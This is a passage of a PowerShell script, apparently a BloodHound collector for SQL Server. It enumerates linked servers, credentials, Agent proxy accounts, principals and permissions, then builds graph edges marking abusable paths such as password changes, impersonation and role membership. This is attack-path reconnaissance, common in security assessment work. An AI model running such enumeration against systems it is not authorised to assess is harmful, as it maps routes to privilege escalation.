            # Always clean up the temp table
            try {
                # Ensure connection is open for cleanup
                if ($connection.State -ne 'Open') {
                    $connection.Open()
                }
                $cleanupCommand = New-Object System.Data.SqlClient.SqlCommand("IF OBJECT_ID('tempdb..$tempTableName') IS NOT NULL DROP TABLE $tempTableName;", $connection)
                $cleanupCommand.ExecuteNonQuery() | Out-Null
            } catch {
                # Ignore cleanup errors
                Write-Verbose "Could not clean up temp table: $_"
            }
        }
    
        # Add MSSQL instances discovered via links to the queue for processing
        if ($linkedServers.Count -gt 0) {
            Write-Host "Discovered $($linkedServers.Count) linked server(s):"
            foreach ($linked in $linkedServers) {
                Write-Host "    $($linked.Path)"
                
                # Get FQDN for the linked server
                $serverName = if ($linked.DataSource) { $linked.DataSource.Split('\')[0] } else { $linked.LinkedServer }
                if (-not $serverName) { continue }
    
                try {
                    $serverName = [System.Net.Dns]::GetHostEntry($serverName).HostName.ToLower()
                } catch {
                    $serverName = $serverName.ToLower()
                }
    
                # Check if already processing
                $alreadyProcessing = ($serverName -in $script:linkedServersToProcess) -or 
                                    ($script:serversToProcess.Values.ServerName.ToLower() -contains $serverName)
    
                if (-not $CollectFromLinkedServers) {
                    Write-Host "        Skipping linked server enumeration (use -CollectFromLinkedServers to enable collection)" -ForegroundColor Yellow
                } elseif (-not $alreadyProcessing) {
                    Write-Host "        Adding $serverName to processing queue" -ForegroundColor Cyan
                    $script:linkedServersToProcess += $serverName
                } else {
                    Write-Host "        Server already in queue for processing" -ForegroundColor Cyan
                }
            }
            # If new linked servers were discovered during processing, the while loop will continue
            if ($script:linkedServersToProcess.Count -gt 0) {
                Write-Host "Discovered $($script:linkedServersToProcess.Count) additional linked servers to process" -ForegroundColor Cyan
            }
        }
    
        # Enumerate credentials
        Write-Host "Enumerating credentials..."
    
        $credentialsQuery = @"
SELECT 
credential_id,
name AS credential_name,
credential_identity,
create_date,
modify_date
FROM sys.credentials
ORDER BY credential_id
"@
        $credentialsCommand = New-Object System.Data.SqlClient.SqlCommand($credentialsQuery, $connection)
        $credentialsAdapter = New-Object System.Data.SqlClient.SqlDataAdapter($credentialsCommand)
        $credentialsTable = New-Object System.Data.DataSet
        $credentialsAdapter.Fill($credentialsTable) | Out-Null
    
    # Process credentials
    $credentials = @()
    foreach ($row in $credentialsTable.Tables[0].Rows) {
        $credentialIdentity = $row["credential_identity"].ToString()
        
        $resolvedPrincipal = Resolve-DomainPrincipal $credentialIdentity
    
        $credential = [PSCustomObject]@{
                CredentialId = $row["credential_id"].ToString()
                CredentialName = $row["credential_name"].ToString()
                CredentialIdentity = $credentialIdentity
                CreateDate = $row["create_date"].ToString()
                ModifyDate = $row["modify_date"].ToString()
                IsDomainPrincipal = $resolvedPrincipal.IsDomainPrincipal
                ResolvedPrincipal = $resolvedPrincipal
                ResolvedSID = $resolvedPrincipal.SID
                ResolvedType = $resolvedPrincipal.Type
            }
            $credentials += $credential
        }
    
        # Add to server info (will be empty array if no credentials found or error occurred)
        $serverInfo.Credentials = $credentials
    
        # Enumerate SQL Agent Proxy Accounts
        Write-Host "Enumerating SQL Agent proxy accounts..."
    
        $proxyAccountsQuery = @"
SELECT 
p.proxy_id,
p.name AS proxy_name,
p.credential_id,
c.name AS credential_name,
c.credential_identity,
p.enabled,
p.description,
-- Get subsystems this proxy can access
STUFF((
    SELECT ', ' + ss.subsystem
    FROM msdb.dbo.sysproxysubsystem ps
    INNER JOIN msdb.dbo.syssubsystems ss ON ps.subsystem_id = ss.subsystem_id
    WHERE ps.proxy_id = p.proxy_id
    FOR XML PATH('')
), 1, 2, '') AS subsystems,
-- Get principals that can use this proxy (using sid column)
STUFF((
    SELECT ', ' + SUSER_SNAME(spl.sid)
    FROM msdb.dbo.sysproxylogin spl
    WHERE spl.proxy_id = p.proxy_id
        AND SUSER_SNAME(spl.sid) IS NOT NULL
    FOR XML PATH('')
), 1, 2, '') AS authorized_principals
FROM msdb.dbo.sysproxies p
INNER JOIN sys.credentials c ON p.credential_id = c.credential_id
ORDER BY p.proxy_id
"@
        # Initialize proxy accounts array
        $proxyAccounts = @()
        
        try {
            $proxyAccountsCommand = New-Object System.Data.SqlClient.SqlCommand($proxyAccountsQuery, $connection)
            $proxyAccountsAdapter = New-Object System.Data.SqlClient.SqlDataAdapter($proxyAccountsCommand)
            $proxyAccountsTable = New-Object System.Data.DataSet
            $proxyAccountsAdapter.Fill($proxyAccountsTable) | Out-Null
    
            # Process proxy accounts
            foreach ($row in $proxyAccountsTable.Tables[0].Rows) {
    
                $credentialIdentity = $row["credential_identity"].ToString()
                $resolvedPrincipal = Resolve-DomainPrincipal $credentialIdentity
                
                $proxyAccount = [PSCustomObject]@{
                    ProxyId = $row["proxy_id"].ToString()
                    ProxyName = $row["proxy_name"].ToString()
                    CredentialId = $row["credential_id"].ToString()
                    CredentialName = $row["credential_name"].ToString()
                    CredentialIdentity = $credentialIdentity
                    Enabled = $row["enabled"] -eq $true
                    Description = if (-not [System.DBNull]::Value.Equals($row["description"])) { $row["description"].ToString() } else { "" }
                    Subsystems = if (-not [System.DBNull]::Value.Equals($row["subsystems"])) { $row["subsystems"].ToString() } else { "" }
                    AuthorizedPrincipals = if (-not [System.DBNull]::Value.Equals($row["authorized_principals"])) { $row["authorized_principals"].ToString() } else { "" }
                    IsDomainPrincipal = $resolvedPrincipal.IsDomainPrincipal
                    ResolvedPrincipal = $resolvedPrincipal
                    ResolvedSID = $resolvedPrincipal.SID
                    ResolvedType = $resolvedPrincipal.Type
                }
                $proxyAccounts += $proxyAccount
            }
        } catch {
            Write-Warning "Cannot enumerate SQL Agent proxy accounts: $($_.Exception.Message)"
        }
    
        # Add to server info
        $serverInfo.ProxyAccounts = $proxyAccounts
    
        # Close the connection
        $connection.Close()
    }
    
    $databaseNames = @()
    $linkedServerNames = @()

    # Get names for list properties
    foreach ($database in $serverInfo.Databases) {
        $databaseNames += $database.Name
    }
    foreach ($linkedServer in $serverInfo.LinkedServers) {
        $linkedServerNames += $linkedServer.LinkedServer
    }

    # Process all graph data (unified for all output formats)
    if ($OutputFormat -ne "JSON") {

        # Create Server node
        Add-Node -Id $serverInfo.ObjectIdentifier `
                -Kinds @("MSSQL_Server") `
                -Properties @{
                    name = $serverInfo.Name
                    databases = $databaseNames
                    domainPrincipalsWithControlServer = $serverInfo.DomainPrincipalsWithControlServer
                    domainPrincipalsWithImpersonateAnyLogin = $serverInfo.DomainPrincipalsWithImpersonateAnyLogin
                    domainPrincipalsWithSecurityadmin = $serverInfo.DomainPrincipalsWithSecurityadmin
                    domainPrincipalsWithSysadmin = $serverInfo.DomainPrincipalsWithSysadmin
                    extendedProtection = $serverInfo.ExtendedProtection
                    forceEncryption = $serverInfo.ForceEncryption
                    instanceName = $serverInfo.InstanceName
                    isAnyDomainPrincipalSysadmin = $serverInfo.IsAnyDomainPrincipalSysadmin
                    isMixedModeAuthEnabled = $serverInfo.IsMixedModeAuthEnabled
                    linkedToServers = $linkedServerNames
                    port = $serverInfo.Port
                    serviceAccount = $serverInfo.ServiceAccounts[0].Name
                    servicePrincipalNames = $serverInfo.ServicePrincipalNames
                    version = $serverInfo.Version

                } `
                -Icon @{
                    type = "font-awesome"
                    name = "server"
                    color = "#42b9f5"
                }
                
        # Create Server Principal nodes
        Write-Host "Creating server principal nodes"
        foreach ($principal in $serverInfo.ServerPrincipals) {

            $props = @{
                name = $principal.Name
                principalId = $principal.PrincipalID
                createDate = $principal.CreateDate
                modifyDate = $principal.ModifyDate
                SQLServer = $principal.SQLServerName
            }

            # Add server roles for logins and user-defined roles
            if ($principal.MemberOf.Count -gt 0) {
                $props.memberOfRoles = @($principal.MemberOf | ForEach-Object { 
                    $_.ObjectIdentifier.Split('@')[0] 
                })
            }

            # Add server role members
            if ($principal.Members.Count -gt 0) {
                $props.members = @($principal.Members | ForEach-Object { 
                    $_.Split('@')[0] 
                })
            }
            
            # Add type-specific properties to server logins
            if ($principal.TypeDescription -in @("WINDOWS_LOGIN", "WINDOWS_GROUP", "SQL_LOGIN", "ASYMMETRIC_KEY_MAPPED_LOGIN", "CERTIFICATE_MAPPED_LOGIN")) {
                try {
                    $props.activeDirectorySID = $principal.SecurityIdentifier
                    # Resolve the SID to a principal name
                    $sid = New-Object System.Security.Principal.SecurityIdentifier($principal.SecurityIdentifier)
                    $resolvedPrincipalName = $sid.Translate([System.Security.Principal.NTAccount]).Value
                    $props.activeDirectoryPrincipal = $resolvedPrincipalName
                } catch {
                    Write-Verbose "Could not resolve SID $($principal.SecurityIdentifier) for $($principal.Name): $_"
                }
                
                $props.defaultDatabase = $principal.DefaultDatabaseName
                $props.disabled = $principal.IsDisabled -eq "1"
                $props.isActiveDirectoryPrincipal = $principal.IsActiveDirectoryPrincipal -eq "1"
                $props.name = $principal.Name
                $props.type = $principal.TypeDescription
            } else {
                # Server roles
                $props.isFixedRole = $principal.IsFixedRole -eq "1"
            }
            
            # Add permissions if any
            if ($principal.Permissions.Count -gt 0) {
                $props.explicitPermissions = @($principal.Permissions | ForEach-Object { $_.Permission })
            }
            
            $kinds = $null
            $kinds = Get-BloodHoundKinds -typeDescription $principal.TypeDescription -isFixedRole ($principal.IsFixedRole -eq "1") -context "Server"
            # Skip if we couldn't determine the node type
            if ($null -eq $kinds) {
                Write-Verbose "Skipping principal node creation for unknown type: $($principal.Name) ($($principal.TypeDescription))"
                continue
            }

            $icon = if ($principal.TypeDescription -eq "SERVER_ROLE") {
                @{ type = "font-awesome"; name = "users-gear"; color = "#6942f5" }
            } elseif ($principal.TypeDescription -eq "SQL_LOGIN") {
                @{ type = "font-awesome"; name = "user-gear"; color = "#dd42f5" }
            }

            Add-Node -Id $principal.ObjectIdentifier `
                    -Kinds $kinds `
                    -Properties $props `
                    -Icon $icon
        }

        # Create Database nodes
        foreach ($db in $serverInfo.Databases) {
            $dbProps = @{
                name = $db.Name
                SQLServer = $serverInfo.Name
                SQLServerID = $serverInfo.ObjectIdentifier
                isTrustworthy = if ($null -ne $db.TRUSTWORTHY) { [bool]$db.TRUSTWORTHY } else { $false }
            }
            
            # Only add owner properties if they're not null
            if ($db.OwnerLoginName -and $db.OwnerLoginName -ne "Unknown") {
                $dbProps.ownerLoginName = $db.OwnerLoginName
            }
            if ($db.OwnerPrincipalID) {
                $dbProps.ownerPrincipalID = $db.OwnerPrincipalID
            }
            if ($db.OwnerObjectIdentifier) {
                $dbProps.OwnerObjectIdentifier = $db.OwnerObjectIdentifier
            }
            
            Add-Node -Id $db.ObjectIdentifier `
                    -Kinds @("MSSQL_Database") `
                    -Properties $dbProps `
                    -Icon @{
                        type = "font-awesome"
                        name = "database"
                        color = "#f54242"
                    }
        }

        # Create Database Principal nodes
        Write-Host "Creating database principal nodes"
        foreach ($db in $serverInfo.Databases) {
            foreach ($principal in $db.DatabasePrincipals) {

                $props = @{
                    name = "$($principal.Name)@$($db.Name)"
                    principalId = $principal.PrincipalID
                    database = $db.Name
                    createDate = $principal.CreateDate
                    modifyDate = $principal.ModifyDate
                    defaultSchema = $principal.DefaultSchemaName
                    SQLServer = $principal.SQLServerName
                }

                # Add database roles for users and user-defined roles
                if ($principal.MemberOf.Count -gt 0) {
                    $props.memberOfRoles = @($principal.MemberOf | ForEach-Object { 
                        $_.ObjectIdentifier.Split('@')[0] 
                    })
                }

                # Add database role members
                if ($principal.Members.Count -gt 0) {
                    $props.members = @($principal.Members | ForEach-Object { 
                        $_.Split('@')[0]
                    })
                }                
                
                # Add type-specific properties
                if ($principal.TypeDescription -in @("WINDOWS_USER", "WINDOWS_GROUP", "SQL_USER", "ASYMMETRIC_KEY_MAPPED_USER", "CERTIFICATE_MAPPED_USER")) {

                    # Get the login this user is mapped to
                    if ($principal.ServerLogin) {
                        $props.serverLogin = $principal.ServerLogin.ObjectIdentifier.Split('@')[0]
                        
                        # Write this user to the list of users the login is mapped to
                        $existingLoginNode = $script:bloodhoundOutput.graph.nodes | Where-Object { $_.Kinds -contains "MSSQL_Login" -and $_.Id -eq $principal.ServerLogin.ObjectIdentifier }
                        if ($existingLoginNode) {
                            if (-not $existingLoginNode.Properties.databaseUsers) {
                                $existingLoginNode.Properties.databaseUsers = @()
                            }
                            $existingLoginNode.Properties.databaseUsers += "$($principal.Name)@$($db.Name)"
                        }
                    }
                    $props.type = $principal.TypeDescription
                } elseif ($principal.TypeDescription -eq "DATABASE_ROLE") {
                    # Database roles
                    $props.isFixedRole = $principal.IsFixedRole -eq "1"
                } else {
                    # Application roles
                }
                
                # Add permissions if any
                if ($principal.Permissions.Count -gt 0) {
                    $props.explicitPermissions = @($principal.Permissions | ForEach-Object { $_.Permission })
                }

                # Add resolved SID if available
                if ($principal.SecurityIdentifier) {
                    $props.SecurityIdentifier = $principal.SecurityIdentifier
                }
                
                $kinds = Get-BloodHoundKinds -typeDescription $principal.TypeDescription -isFixedRole ($principal.IsFixedRole -eq "1") -context "Database"
                
                $icon = switch ($principal.TypeDescription) {
                    "DATABASE_ROLE" { @{ type = "font-awesome"; name = "users"; color = "#f5a142" } }
                    "APPLICATION_ROLE" { @{ type = "font-awesome"; name = "robot"; color = "#6ff542" } }
                    "SQL_USER" { @{ type = "font-awesome"; name = "user"; color = "#f5ef42" } }
                }

                Add-Node -Id $principal.ObjectIdentifier `
                        -Kinds $kinds `
                        -Properties $props `
                        -Icon $icon
            }
        }

        # Create Linked Server nodes
        Write-Host "Creating linked server nodes"
        $createdLinkedServerNodes = @{}
        foreach ($linkedServer in $serverInfo.LinkedServers) {
            if ($linkedServer.DataSource -and -not $createdLinkedServerNodes.ContainsKey($linkedServer.ResolvedObjectIdentifier)) {
                $linkedServerName = $linkedServer.DataSource
                if ($linkedServerName -match '^([^\\,:]+)') {
                    $linkedServerName = $matches[1]
                }
                
                Add-Node -Id $linkedServer.ResolvedObjectIdentifier `
                    -Kinds @("MSSQL_Server") `
                    -Properties @{
                        name = $linkedServerName
                        hasLinksFromServers = @($serverInfo.ObjectIdentifier)
                        isLinkedServerTarget = $true
                    } `
                    -Icon @{
                        type = "font-awesome"
                        name = "server"
                        color = "#42b9f5"
                    }
                
                $createdLinkedServerNodes[$linkedServer.ResolvedObjectIdentifier] = $true
            }
        }

        # Create Computer node for server
        $computer = Resolve-DomainPrincipal $serverHostname
        if ($computer.SID) {
            Add-Node -Id $computer.ObjectIdentifier `
            -Kinds @("Computer", "Base") `
            -Properties @{
                name = $computer.Name
                distinguishedName = $computer.DistinguishedName
                DNSHostName = $computer.DNSHostName
                domain = $computer.Domain
                isDomainPrincipal = $computer.IsDomainPrincipal
                isEnabled = $computer.Enabled
                SAMAccountName = $computer.SamAccountName
                SID = $computer.SID
                userPrincipalName = $computer.UserPrincipalName
            }
        }

        # Create Base nodes for service accounts
        foreach ($serviceAccount in $serverInfo.ServiceAccounts) {
            if ($serviceAccount.ObjectIdentifier) {
                Add-Node -Id $serviceAccount.ObjectIdentifier `
                        -Kinds @($serviceAccount.Type, "Base") `
                        -Properties @{
                            name = $serviceAccount.Name
                            distinguishedName = $serviceAccount.DistinguishedName
                            DNSHostName = $serviceAccount.DNSHostName
                            domain = $serviceAccount.Domain
                            isDomainPrincipal = $serviceAccount.IsDomainPrincipal
                            isEnabled = $serviceAccount.Enabled
                            SAMAccountName = $serviceAccount.SamAccountName
                            SID = $serviceAccount.SID
                            userPrincipalName = $serviceAccount.UserPrincipalName
                        }
            }
        }

        # Create Base nodes for credentials
        Write-Host "Creating domain principal nodes"
        $createdCredentialBaseNodes = @{}
        foreach ($credential in $serverInfo.Credentials) {
            if ($credential.IsDomainPrincipal -and $credential.ResolvedSID -and 
                -not $createdCredentialBaseNodes.ContainsKey($credential.ResolvedSID)) {
                              
                # Determine node type based on credential identity
                $nodeKind = $credential.ResolvedType
                
                Add-Node -Id $credential.ResolvedSID `
                        -Kinds @($nodeKind, "Base") `
                        -Properties @{
                            name = $credential.ResolvedPrincipal.Name
                            distinguishedName = $credential.ResolvedPrincipal.DistinguishedName
                            DNSHostName = $credential.ResolvedPrincipal.DNSHostName
                            domain = $credential.ResolvedPrincipal.Domain
                            isDomainPrincipal = $credential.ResolvedPrincipal.IsDomainPrincipal
                            isEnabled = $credential.ResolvedPrincipal.Enabled
                            SAMAccountName = $credential.ResolvedPrincipal.SamAccountName
                            SID = $credential.ResolvedPrincipal.SID
                            userPrincipalName = $credential.ResolvedPrincipal.UserPrincipalName
                        }
                
                $createdCredentialBaseNodes[$credential.ResolvedSID] = $true
            }
        }

        # Create Base nodes for database-scoped credentials
        foreach ($db in $serverInfo.Databases) {
            if ($db.PSObject.Properties.Name -contains "DatabaseScopedCredentials") {
                foreach ($credential in $db.DatabaseScopedCredentials) {
                    if ($credential.IsDomainPrincipal -and $credential.ResolvedSID -and 
                        -not $createdCredentialBaseNodes.ContainsKey($credential.ResolvedSID)) {
                        
                        # Determine node type based on credential identity
                        $nodeKind = $credential.ResolvedType
                        
                        Add-Node -Id $credential.ResolvedSID `
                                -Kinds @($nodeKind, "Base") `
                                -Properties @{
                                    name = $credential.ResolvedPrincipal.Name
                                    distinguishedName = $credential.ResolvedPrincipal.DistinguishedName
                                    DNSHostName = $credential.ResolvedPrincipal.DNSHostName
                                    domain = $credential.ResolvedPrincipal.Domain
                                    isDomainPrincipal = $credential.ResolvedPrincipal.IsDomainPrincipal
                                    isEnabled = $credential.ResolvedPrincipal.Enabled
                                    SAMAccountName = $credential.ResolvedPrincipal.SamAccountName
                                    SID = $credential.ResolvedPrincipal.SID
                                    userPrincipalName = $credential.ResolvedPrincipal.UserPrincipalName
                                }            

                        $createdCredentialBaseNodes[$credential.ResolvedSID] = $true
                    }
                }
            }
        }

        # Create nodes for accounts with logins
        foreach ($principal in $serverInfo.ServerPrincipals) {
            if (($principal.TypeDescription -eq "WINDOWS_LOGIN" -or $principal.TypeDescription -eq "WINDOWS_GROUP") -and 
                $principal.SecurityIdentifier) {
                
                # Check conditions for creating Base node
                $loginEnabled = $principal.IsDisabled -ne "1"
                $permissionToConnect = $false
                
                foreach ($perm in $principal.Permissions) {
                    if ($perm.Permission -eq "CONNECT SQL" -and $perm.State -eq "GRANT") {
                        $permissionToConnect = $true
                        break
                    }
                }
                
                if ($permissionToConnect -and $loginEnabled) {

                    $adObject = Resolve-DomainPrincipal $principal.Name.Split('\')[1]
                    if (-not $adObject.SID) {
                        $adObject = Resolve-DomainPrincipal $principal.SecurityIdentifier
                    }

                    # Make sure this is an AD object with a domain SID
                    if ($adObject.SID -and $adObject.SID -like "S-1-5-21-*") {

                        Add-Node -Id $adObject.SID `
                        -Kinds @($adObject.Type, "Base") `
                        -Properties @{
                            name = $adObject.Name
                            distinguishedName = $adObject.DistinguishedName
                            DNSHostName = $adObject.DNSHostName
                            domain = $adObject.Domain
                            isDomainPrincipal = $adObject.IsDomainPrincipal
                            isEnabled = $adObject.Enabled
                            SAMAccountName = $adObject.SamAccountName
                            SID = $adObject.SID
                            userPrincipalName = $adObject.UserPrincipalName
                        }
                    }
                }
            }
        }

        # Create nodes for local groups with SQL logins
        if ($serverInfo.PSObject.Properties.Name -contains "LocalGroupsWithLogins") {
            foreach ($groupObjId in $serverInfo.LocalGroupsWithLogins.Keys) {
                $groupInfo = $serverInfo.LocalGroupsWithLogins[$groupObjId]
                $groupPrincipal = $groupInfo.Principal
                
                # Create Group node for local machine SID and well-known local SIDs
                if ($groupPrincipal.SIDResolved) {
                    $groupObjectId = "$serverFQDN-$($groupPrincipal.SIDResolved)"

                    Add-Node -Id $groupObjectId `
                            -Kinds @("Group", "Base") `
                            -Properties @{
                                name = $groupPrincipal.Name.Split('\')[-1]
                            }
                }
                
                # Create Base nodes for domain members (already resolved)
                foreach ($member in $groupInfo.Members) {
                    
                    Add-Node -Id $member.SID `
                            -Kinds @($member.Type, "Base") `
                            -Properties @{
                                name = $member.Name
                                distinguishedName = $member.DistinguishedName
                                DNSHostName = $member.DNSHostName
                                domain = $member.Domain
                                isDomainPrincipal = $member.IsDomainPrincipal
                                isEnabled = $member.Enabled
                                SAMAccountName = $member.SamAccountName
                                SID = $member.SID
                                userPrincipalName = $member.UserPrincipalName
                            }
                }
            }
        }
            
        # Process Server Principal Permissions
        Write-Host "Creating edges for server principals"
        foreach ($principal in $serverInfo.ServerPrincipals) {
            
            foreach ($perm in $principal.Permissions) {

                # Ignore DENY 
                if (($perm.State -eq "GRANT" -or $perm.State -eq "GRANT_WITH_GRANT_OPTION") -and $perm.Permission -in $ServerPermissionsToMap) {
                    switch ($perm.Permission) {

                        "ALTER" {

                            # Set source and resolve target from permission
                            if (Set-EdgeContext -SourcePrincipal $principal -Permission $perm -ServerInfo $serverInfo) {
                                $targetPrincipal = $script:CurrentEdgeContext.targetPrincipal

                                # Create the non-traversable MSSQL_Alter edge
                                Add-Edge -Kind "MSSQL_Alter"

                                # Can only add members to fixed roles user is a member of (except sysadmin) and to user-defined roles (doesn't require membership)
                                if ($targetPrincipal.TypeDescription -eq "SERVER_ROLE") {
                                    $canAlterRole = $false
                                    
                                    if ($targetPrincipal.IsFixedRole -ne "1") {
                                        # User-defined role - anyone with ALTER can alter it
                                        $canAlterRole = $true
                                    } else {
                                        # Fixed role - can only add members if source is a member of this role
                                        # Check if source principal is a member of the target role (directly or through nesting)
                                        #$isMemberOfTargetRole = Get-NestedRoleMembership -Principal $principal -TargetRoleName $targetPrincipal.Name -ServerInfo $serverInfo
                                        
                                        # Check if source principal is a DIRECT member of the target role (no nesting)
                                        $isMemberOfTargetRole = $false
                                        foreach ($role in $principal.MemberOf) {
                                            $roleName = if ($role.PSObject.Properties.Name -contains "Name") {
                                                $role.Name
                                            } else {
                                                # Extract role name from ObjectIdentifier
                                                $objIdParts = $role.ObjectIdentifier -split '@'
                                                if ($objIdParts.Count -gt 0) { $objIdParts[0] }
                                            }
                                            
                                            if ($roleName -eq $targetPrincipal.Name) {
                                                $isMemberOfTargetRole = $true
                                                break
                                            }
                                        }

                                        # Can alter if member of the role (but not for sysadmin - it doesn't accept members that are roles)
                                        if ($isMemberOfTargetRole -and $targetPrincipal.Name -ne "sysadmin") {
                                            $canAlterRole = $true
                                        }
                                    }
                                    
                                    if ($canAlterRole) {
                                        Add-Edge -Kind "MSSQL_AddMember"
                                    }
                                }
                                
                                elseif ($targetPrincipal.TypeDescription -eq "SQL_LOGIN") {
                                    # Can't change another login's password without ALTER ANY LOGIN, even with ALTER or CONTROL explicitly assigned
                                    # https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-login-transact-sql?view=sql-server-ver17#permissions
                                } 
                            }
                        }
                        
                        "ALTER ANY LOGIN" {    
                        
                            # Add the permission to the server for composition
                            Set-EdgeContext -SourcePrincipal $principal -TargetPrincipal $serverInfo -Permission $perm
                            Add-Edge -Kind "MSSQL_AlterAnyLogin" -Target $serverInfo.ObjectIdentifier

                            foreach ($targetPrincipal in $serverInfo.ServerPrincipals) {

                                # End node must be a SQL login (not a Windows one) and cannot be the sa login
                                if ($targetPrincipal.TypeDescription -eq "SQL_LOGIN" -and 
                                $targetPrincipal.Name -ne "sa" -and 
                                $targetPrincipal.ObjectIdentifier -ne $principal.ObjectIdentifier) {                        
                                    
                                    # Check if target login has sysadmin or CONTROL SERVER, including when the permission is nested
                                    $targetHasSysadmin = Get-NestedRoleMembership -Principal $targetPrincipal -TargetRoleName "sysadmin" -ServerInfo $serverInfo
                                    $targetHasControlServer = Get-EffectivePermissions -Principal $targetPrincipal -TargetPermission "CONTROL SERVER" -ServerInfo $serverInfo

                                    # Create edge if the target does not have sysadmin or CONTROL SERVER
                                    if (-not ($targetHasSysadmin -or $targetHasControlServer)) {
                                        Set-EdgeContext -SourcePrincipal $principal -TargetPrincipal $targetPrincipal -Permission $perm
                                        Add-Edge -Kind "MSSQL_ChangePassword"
                                    } else {
                                        # If target has sysadmin or CONTROL SERVER, the source must also have sysadmin or CONTROL SERVER
                                        # If source is sysadmin or has CONTROL SERVER, don't create the edge because they can just abuse those permissions without ALTER LOGIN
                                    }
                                }
                            }
                        }
                        
                        "ALTER ANY SERVER ROLE" {

                            # Add the permission to the server for composition
                            Set-EdgeContext -SourcePrincipal $principal -TargetPrincipal $serverInfo -Permission $perm
                            Add-Edge -Kind "MSSQL_AlterAnyServerRole" -Target $serverInfo.ObjectIdentifier

                            # Then, create traversable MSSQL_AddMember edges to each applicable server role
                            foreach ($targetPrincipal in $serverInfo.ServerPrincipals) {

                                # Can only add members to fixed roles user is a member of (except sysadmin) and to user-defined roles (doesn't require membership)
                                if ($targetPrincipal.TypeDescription -eq "SERVER_ROLE") {
                                    $canAlterRole = $false
                                    
                                    if ($targetPrincipal.IsFixedRole -ne "1") {
                                        # User-defined role - anyone with ALTER can alter it
                                        $canAlterRole = $true
                                    } else {
                                        # Fixed role - can only add members if source is a member of this role
                                        # Check if source principal is a member of the target role (directly or through nesting)
                                        #$isMemberOfTargetRole = Get-NestedRoleMembership -Principal $principal -TargetRoleName $targetPrincipal.Name -ServerInfo $serverInfo
                                        
                                        # Check if source principal is a DIRECT member of the target role (no nesting)
                                        $isMemberOfTargetRole = $false
                                        foreach ($role in $principal.MemberOf) {
                                            $roleName = if ($role.PSObject.Properties.Name -contains "Name") {
                                                $role.Name
                                            } else {
                                                # Extract role name from ObjectIdentifier
                                                $objIdParts = $role.ObjectIdentifier -split '@'
                                                if ($objIdParts.Count -gt 0) { $objIdParts[0] }
                                            }
                                            
                                            if ($roleName -eq $targetPrincipal.Name) {
                                                $isMemberOfTargetRole = $true
                                                break
                                            }
                                        }

                                        # Can alter if member of the role (but not for sysadmin - it doesn't accept members that are roles)
                                        if ($isMemberOfTargetRole -and $targetPrincipal.Name -ne "sysadmin") {
                                            $canAlterRole = $true
                                        }
                                    }
                                    
                                    if ($canAlterRole) {
                                        Set-EdgeContext -SourcePrincipal $principal -TargetPrincipal $targetPrincipal -Permission $perm
                                        Add-Edge -Kind "MSSQL_AddMember"
                                    }
                                }
                            }                      
                        }

                        "CONNECT SQL" {

                            if (Set-EdgeContext -SourcePrincipal $principal -Permission $perm -ServerInfo $serverInfo) {
                                if ($principal.IsDisabled -ne "1") {
                                    Add-Edge -Kind "MSSQL_Connect"
                                }
                            }
                        }                        
                        
                        "CONNECT ANY DATABASE" {

                            Set-EdgeContext -SourcePrincipal $principal -TargetPrincipal $serverInfo -Permission $perm
                            Add-Edge -Kind "MSSQL_ConnectAnyDatabase" -Target $serverInfo.ObjectIdentifier
                        }
                        
                        "CONTROL" {

                            if (Set-EdgeContext -SourcePrincipal $principal -Permission $perm -ServerInfo $serverInfo) {
                                $targetPrincipal = $script:CurrentEdgeContext.targetPrincipal

                                # Create the non-traversable MSSQL_Control edge
                                Add-Edge -Kind "MSSQL_Control"

                                # Can only add members to fixed roles user is a member of (except sysadmin) and to user-defined roles (doesn't require membership)
                                if ($targetPrincipal.TypeDescription -eq "SERVER_ROLE") {
                                    $canAlterRole = $false
                                    
                                    if ($targetPrincipal.IsFixedRole -ne "1") {
                                        # User-defined role - anyone with ALTER can alter it
                                        $canAlterRole = $true
                                    } else {
                                        # Fixed role - can only add members if source is a member of this role
                                        # Check if source principal is a member of the target role (directly or through nesting)
                                        #$isMemberOfTargetRole = Get-NestedRoleMembership -Principal $principal -TargetRoleName $targetPrincipal.Name -ServerInfo $serverInfo

                                        # Check if source principal is a DIRECT member of the target role (no nesting)
                                        $isMemberOfTargetRole = $false
                                        foreach ($role in $principal.MemberOf) {
                                            $roleName = if ($role.PSObject.Properties.Name -contains "Name") {
                                                $role.Name
                                            } else {
                                                # Extract role name from ObjectIdentifier
                                                $objIdParts = $role.ObjectIdentifier -split '@'
                                                if ($objIdParts.Count -gt 0) { $objIdParts[0] }
                                            }
                                            
                                            if ($roleName -eq $targetPrincipal.Name) {
                                                $isMemberOfTargetRole = $true
                                                break
                                            }
                                        }
                                        
                                        # Can alter if member of the role (but not for sysadmin - it doesn't accept members that are roles)
                                        if ($isMemberOfTargetRole -and $targetPrincipal.Name -ne "sysadmin") {
                                            $canAlterRole = $true
                                        }
                                    }
                                    
                                    if ($canAlterRole) {
                                        Add-Edge -Kind "MSSQL_AddMember"
                                        Add-Edge -Kind "MSSQL_ChangeOwner"
                                    }
                                }
                                
                                # CONTROL on login = ImpersonateLogin, no restrictions (even sa)
                                elseif ($targetPrincipal.TypeDescription -in @("WINDOWS_LOGIN", "WINDOWS_GROUP", "SQL_LOGIN", "ASYMMETRIC_KEY_MAPPED_LOGIN", "CERTIFICATE_MAPPED_LOGIN")) {

                                    Add-Edge -Kind "MSSQL_ExecuteAs"
                                }
                            }
                        }
                        
                        "CONTROL SERVER" {
                            Set-EdgeContext -SourcePrincipal $principal -TargetPrincipal $serverInfo -Permission $perm
                            Add-Edge -Kind "MSSQL_ControlServer"
                        }
                        
                        "IMPERSONATE" {

                            if (Set-EdgeContext -SourcePrincipal $principal -Permission $perm -ServerInfo $serverInfo) {
                                # Only applies to logins at the server level
                                Add-Edge -Kind "MSSQL_Impersonate"
                                Add-Edge -Kind "MSSQL_ExecuteAs"
                            }
                        }
                        
                        "IMPERSONATE ANY LOGIN" {

                            Set-EdgeContext -SourcePrincipal $principal -TargetPrincipal $serverInfo -Permission $perm
                            # Add the permission to the server
                            Add-Edge -Kind "MSSQL_ImpersonateAnyLogin" -Target $serverInfo.ObjectIdentifier
                        }
                        
                        "TAKE OWNERSHIP" {

                            if (Set-EdgeContext -SourcePrincipal $principal -Permission $perm -ServerInfo $serverInfo) {
                                $targetPrincipal = $script:CurrentEdgeContext.targetPrincipal

                                # Create the non-traversable MSSQL_TakeOwnership edge
                                Add-Edge -Kind "MSSQL_TakeOwnership"

                                # Only applies to roles at the server level
                                if ($targetPrincipal.TypeDescription -eq "SERVER_ROLE") {
                                    
                                    Add-Edge -Kind "MSSQL_ChangeOwner"
                                }
                            }
